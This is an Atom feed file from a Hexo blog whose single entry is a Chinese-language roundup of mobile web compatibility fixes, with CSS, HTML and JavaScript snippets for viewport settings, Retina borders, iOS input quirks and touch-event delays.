<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jiuylq</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jiuylq.github.io/"/>
  <updated>2019-07-10T12:50:21.340Z</updated>
  <id>https://jiuylq.github.io/</id>
  
  <author>
    <name>jiuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>移动端常见兼容方法总结</title>
    <link href="https://jiuylq.github.io/2019/07/10/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E8%A7%81%E5%85%BC%E5%AE%B9%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://jiuylq.github.io/2019/07/10/移动端常见兼容方法总结/</id>
    <published>2019-07-10T12:46:20.000Z</published>
    <updated>2019-07-10T12:50:21.340Z</updated>
    
    <content type="html"><![CDATA[<p>好久没有写博客了，今天让我们来总结一下在移动端开发网页需要注意的一些常见的兼容性问题，本人能力有限，仅仅收集了一些自己用到过的，及网上收集到的资料，如你有更多的知识点补充，欢迎联系，本文仅供参考，请以实际开发为准。<br><a id="more"></a></p><h2 id="移动端常见兼容方法总结"><a href="#移动端常见兼容方法总结" class="headerlink" title="移动端常见兼容方法总结"></a>移动端常见兼容方法总结</h2><ol><li>安卓浏览器看背景图片，有些设备会模糊</li></ol><p>因为手机分辨率太小，如果按照分辨率来显示网页，字会非常小，安卓手机<code>devicePixoRadio</code>比较乱，有1.5的，有2的也有3的。想让图片在手机里显示更为清晰，必须使用2x的背景图来代替img标签（一般情况下都是2倍的），或者指定<code>background-size:contain</code>;都可以</p><p>用<code>-webkit-min-device-pixel-ratio</code>可以做到不同倍数不同尺寸的图片：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.icon-logo</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(src/assets/logo.png);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">24px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">24px</span>;</span><br><span class="line">  <span class="attribute">background-size</span>: contain;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> screen and (-webkit-min-device-pixel-ratio: <span class="number">2</span>)&#123;</span><br><span class="line">  <span class="selector-class">.icon-logo</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(src/assets/logo@2.png); &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> screen and (-webkit-min-device-pixel-ratio: <span class="number">3</span>)&#123;</span><br><span class="line">  <span class="selector-class">.icon-logo</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(src/assets/logo@3.png); &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">media</span> screen and (-webkit-min-device-pixel-ratio: <span class="number">4</span>)&#123;</span><br><span class="line">  <span class="selector-class">.icon-logo</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(src/assets/logo@4.png); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>页面缩放问题</li></ol><p>设置<code>viewport</code>禁止页面缩放</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"</span> /&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>viewport的各种浏览器设置</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- apple-mobile-web-app-capable是设置Web应用是否以全屏模式运行，可以通过只读属性window.navigator.standalone来确定网页是否以全屏模式显示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-capable"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 顶部状态栏背景色 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 需使用apple-mobile-web-app-capable指定全屏模式。如果content设置为default，则状态栏正常显示。如果设置为blank，则状态栏会有一个黑色的背景。如果设置为blank-translucent，则状态栏显示为黑色半透明。如果设置为default或blank，则页面显示在状态栏的下方，即状态栏占据上方部分，页面占据下方部分，二者没有遮挡对方或被遮挡。如果设置为blank-translucent，则页面会充满屏幕，其中页面顶部会被状态栏遮盖住（会覆盖页面20px高度，而iphone4和itouch4的Retina屏幕为40px）。默认值是default。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-status-bar-style"</span> <span class="attr">content</span>=<span class="string">"black"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- format-detection 启动或禁用自动识别页面中的电话号码。 默认情况下，设备会自动识别任何可能是电话号码的字符串。设置telephone=no可以禁用这项功能--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 手机页面通常在第一次加载后会进行缓存，然后每次刷新会使用缓存而不是去重新向服务器发送请求。如果不希望使用缓存可以设置no-cache。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-cache"</span> /&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>上下拉动滚动条时卡顿、慢</li></ol><p>Android3+和iOSi5+支持CSS3的新属性为overflow-scrolling</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-overflow-scrolling</span>:touch;</span><br><span class="line">  <span class="attribute">overflow-scrolling</span>:touch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>长时间按住页面出现闪退</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">element</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-touch-callout</span>:none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>iphone及ipad下输入框默认内阴影</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">element</span>&#123;</span><br><span class="line">    <span class="attribute">-webkit-appearance</span>:none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>ios和android下触摸元素时出现半透明灰色遮罩</li></ol><p>设置alpha值为0就可以去除本透明灰色遮罩，备注：transparent的属性值在android下无效。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">element</span>&#123;</span><br><span class="line">    <span class="attribute">-webkit-tap-highlight-color</span>:<span class="built_in">rgba</span>(255,255,255,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>active兼容处理 即 伪类：active失效</li></ol><p>方法一：body添加<code>ontouchstart</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">ontouchstart</span>=<span class="string">''</span>&gt;</span></span><br><span class="line">or</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">ontouchstart</span>=<span class="string">''</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方法二：js给document绑定<code>touchstart</code>或<code>touchend</code>事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  a&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>:<span class="selector-id">#000</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>:<span class="selector-id">#fff</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/foo"</span>&gt;</span>bar<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.addEventListentener(<span class="string">'touchstart'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,<span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="10"><li>Retina屏1px边框问题</li></ol><p>通过<code>transform</code>缩放和<code>-webkit-min-device-pixel-ratio</code>进行具体设置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>:<span class="string">''</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>:border-box;</span><br><span class="line">  <span class="attribute">-webkit-box-sizing</span>:border-box;</span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">scale</span>(0.5);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(0.5);</span><br><span class="line">  <span class="attribute">-webkit-transform-origin</span>: left top;</span><br><span class="line">  <span class="attribute">transform-origin</span>: left top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="11"><li>pc端与移动端字体大小的问题</li></ol><p>pc端字体正常显示，但ios真机就出现，h1、span等标签字体比较大  </p><p>旋转屏幕时，字体大小调整的问题<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>,<span class="selector-tag">form</span>,<span class="selector-tag">fieldset</span>,<span class="selector-tag">p</span>,<span class="selector-tag">div</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-text-size-adjust</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">-ms-text-size-adjust</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">text-size-adjust</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="12"><li>transiton闪屏</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*设置内联的元素在3D空间如何呈现：保留3D*/</span></span><br><span class="line"><span class="selector-tag">-webkit-transform-style</span><span class="selector-pseudo">:preserve-3D</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*设置进行转换的元素的背面在面对用户时是否课件：隐藏*/</span></span><br><span class="line"><span class="selector-tag">-webkit-backface-visibility</span><span class="selector-pseudo">:hidden</span>;</span><br></pre></td></tr></table></figure><ol start="13"><li>动画定义3D启用硬件加速</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Element</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-transform</span>:<span class="built_in">translate3d</span>(0, 0, 0)</span><br><span class="line">  transform: <span class="built_in">translate3d</span>(0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="14"><li>webkit mask 兼容处理</li></ol><p>某些低端手机不支持css3 mask，可以选择性的降级处理。</p><p>比如可以使用js判断来引用不同class：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="string">'WebkitMask'</span> <span class="keyword">in</span> <span class="built_in">document</span>.documentElement.style)&#123;</span><br><span class="line">  alert(<span class="string">'支持mask'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  alert(<span class="string">'不支持mask'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="15"><li>圆角bug</li></ol><p>某些Android手机圆角失效</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">background-clip</span>: <span class="selector-tag">padding-box</span>;</span><br></pre></td></tr></table></figure><ol start="16"><li>IOS 拍照，照片被旋转</li></ol><p>图片预览用到 <code>FileReader</code> 接口，上传进度是 ajax 的<code>onUploadProgress</code>事件，都没有问题。</p><p>这里的兼容性主要在于 ios 拍照，图片会被旋转。解决思路是根据旋转角度，用 <code>canvas</code> 再给转回来就可以了，照片相关信息通过<code>exif-js</code>这个库可以轻松获取。</p><ol start="17"><li>键盘遮挡输入框</li></ol><p>虚拟键盘弹起 输入框要随着上移，安卓还好，ios 对 fixed 的处理有点异常</p><p>可以通过设置一个定时器，设置<code>scrollIntoView</code> 就好了</p><ol start="18"><li>检查UA</li></ol><p>判断window和screen 屏幕可用工作区高度/宽：window.screen.availHeight/window.screen.availWidth</p><p>屏幕分辨率的高/宽：+window.screen.height/window.screen.width</p><p>网页可见区域宽/高：+document.body.clientWidth/document.body.clientHeight</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检测是否是移动端</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMobile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(navigator.userAgent.match(<span class="regexp">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span>))) &#123;</span><br><span class="line">    alert(<span class="string">"请在移动端查看（或者开发者模式）"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="19"><li>在移动端图片上传图片兼容低端机的问题</li></ol><p>解决方案:input 加入属性 accept=”image/*” multiple</p><ol start="20"><li>在h5嵌入app中，ios如果出现垂直滚动条时，手指滑动页面滚动之后，滚动很快停下来，好像踩着刹车在开车，有“滚动很吃力”的感觉。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">self.webView.scrollView.decelerationRate = UIScrollViewDecelerationRateNormal;对webview设置了更低的“减速率”</span><br></pre></td></tr></table></figure><ol start="21"><li>移动端click 300ms 延时响应</li></ol><p>解决方案:使用 Fastclick</p><ol start="22"><li>在安卓机上placeholder文字设置行高会偏上</li></ol><p>解决方案:input有placeholder情况下不要设置行高</p><ol start="23"><li>移动端适配lib-flexible</li></ol><p>移动端适配可以使用lib-flexible <a href="https://github.com/amfe/lib-f...，使用rem来布局移动端有一个问题就是px的小数点的问题，不同的手机对于小数点处理方式不一样，有些是四舍五入，有些直接舍去掉，因此在自动生成雪碧图时候图标四周适当留2px的空间，防止图标被裁剪掉" target="_blank" rel="noopener">https://github.com/amfe/lib-f...，使用rem来布局移动端有一个问题就是px的小数点的问题，不同的手机对于小数点处理方式不一样，有些是四舍五入，有些直接舍去掉，因此在自动生成雪碧图时候图标四周适当留2px的空间，防止图标被裁剪掉</a></p><ol start="24"><li>iphonex的适配的解决方案</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"...,viewport-fit=cover"</span> /&gt;</span></span><br><span class="line">body&#123;</span><br><span class="line">    padding-top: constant(safe-area-inset-top);</span><br><span class="line">    padding-top: env(safe-area-inset-top);</span><br><span class="line">    padding-bottom: constant(safe-area-inset-bottom);</span><br><span class="line">    padding-bottom: env(safe-area-inset-bottom);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="25"><li>ios下input为type=button属性disabled设置true,会出现样式文字和背景异常问题</li></ol><p>使用opacity=1来解决<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=button]</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="26"><li>对非可点击元素如(label,span)监听click事件，部分ios版本下不会触发</li></ol><p>css增加cursor:pointer就搞定了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">label</span>, <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">cursor</span>:pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>27.IOS中input键盘事件keyup、keydown、keypress支持不是很好</p><p>用input监听键盘keyup事件，在安卓手机浏览器中是可以的，但是在ios手机浏览器中变红很慢，用输入法输入之后，并未立刻相应keyup事件，只有在通过删除之后才能相应！</p><p>解决：<br>可以用html5的oninput事件去代替keyup</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"testInput"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">'testInput'</span>).addEventListener(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> value = e.target.value;</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="28"><li>ios 设置input 按钮样式会被默认样式覆盖</li></ol><p>设置默认样式为none<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>,</span><br><span class="line"><span class="selector-tag">textarea</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">-webkit-appearance</span>: none; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="29"><li>IOS键盘字母输入，默认首字母大写</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">autocapitalize</span>=<span class="string">"off"</span> /&gt;</span></span><br></pre></td></tr></table></figure><ol start="30"><li>移动端点透问题</li></ol><p>touchstart 早于 touchend 早于click。 亦即click的触发是有延迟的，这个时间大概在300ms左右，也就是说我们tap触发之后蒙层隐藏， 此时 click还没有触发，300ms之后由于蒙层隐藏，我们的click触发到了下面的节点上。</p><p>解决：</p><p>（1）尽量都使用touch事件来替换click事件。例如用touchend事件(推荐)。<br>（2）用fastclick，<a href="https://github.com/ftlabs/fastclick" target="_blank" rel="noopener">https://github.com/ftlabs/fastclick</a><br>（3）用preventDefault阻止标签的click<br>（4）延迟一定的时间(300ms+)来处理事件 （不推荐）<br>（5）以上一般都能解决，实在不行就换成click事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#haorooms"</span>).on(<span class="string">"touchend"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">   event.preventDefault();</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><ol start="31"><li>消除 IE10 里面的那个叉号</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:-ms-clear</span>&#123;<span class="attribute">display</span>:none;&#125;</span><br></pre></td></tr></table></figure><ol start="32"><li>关于 iOS 系统中，中文输入法输入英文时，字母之间可能会出现一个六分之一空格</li></ol><p>可以通过正则去掉<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.value = <span class="keyword">this</span>.value.replace(<span class="regexp">/\u2006/g</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><ol start="33"><li>移动端 HTML5 audio autoplay 失效问题</li></ol><p>这个不是 BUG，由于自动播放网页中的音频或视频，会给用户带来一些困扰或者不必要的流量消耗，所以苹果系统和安卓系统通常都会禁止自动播放和使用 JS 的触发播放，必须由用户来触发才可以播放。</p><p>解决方法思路：先通过用户 touchstart 触碰，触发播放并暂停（音频开始加载，后面用 JS 再操作就没问题了）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'touchstart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementsByTagName(<span class="string">'audio'</span>)[<span class="number">0</span>].play();</span><br><span class="line">  <span class="built_in">document</span>.getElementsByTagName(<span class="string">'audio'</span>)[<span class="number">0</span>].pause();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="34"><li>部分机型存在type为search的input，自带close按钮样式修改方法</li></ol><p>有些机型的搜索input控件会自带close按钮（一个伪元素），而通常为了兼容所有浏览器，我们会自己实现一个，此时去掉原生close按钮的方法为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"search"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.search</span><span class="selector-pseudo">::-webkit-search-cancel-button</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: none;  </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="35"><li>ios下audio只能播放一遍，再次play无法继续播放</li></ol><p>解决方案：play()前先load()下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ar clickAudio = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放点击音效</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">playClickMusic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!clickAudio) &#123;</span><br><span class="line">      clickAudio = $(<span class="string">'#click'</span>)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    clickAudio.load();</span><br><span class="line">    clickAudio.play();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="36"><li>a标签或者button标签等，点击后会有蓝色边框；去掉难看的点击的高亮效果</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">element</span> &#123;</span><br><span class="line">  <span class="attribute">outline</span>: none;</span><br><span class="line">  <span class="attribute">-webkit-tap-highlight-color</span>:<span class="built_in">rgba</span>(0,0,0,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="37"><li>微信浏览器中跳转新网页：window.locaition.href 无效；</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nextPage = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</span><br><span class="line">nextPage.setAttribute(<span class="string">'href'</span>,<span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">nextPage.click();</span><br><span class="line">复</span><br></pre></td></tr></table></figure><ol start="38"><li>禁止ios和android用户选中文字；禁止ios 长按时不触发系统的菜单，禁止ios&amp;android长按时下载图片</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-user-select</span>:none；</span><br><span class="line">  -webkit-touch-callout: none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：  </p><p><a href="https://segmentfault.com/a/1190000009898072" target="_blank" rel="noopener">移动端开发的兼容问题</a><br><a href="https://www.jb51.net/article/84973.htm" target="_blank" rel="noopener">倾力总结40条常见的移动端Web页面问题解决方案</a><br><a href="https://www.cnblogs.com/zhoudawei/p/7497544.html" target="_blank" rel="noopener">web前端兼容性问题总结</a></p>]]></content>
    
    <summary type="html">
    
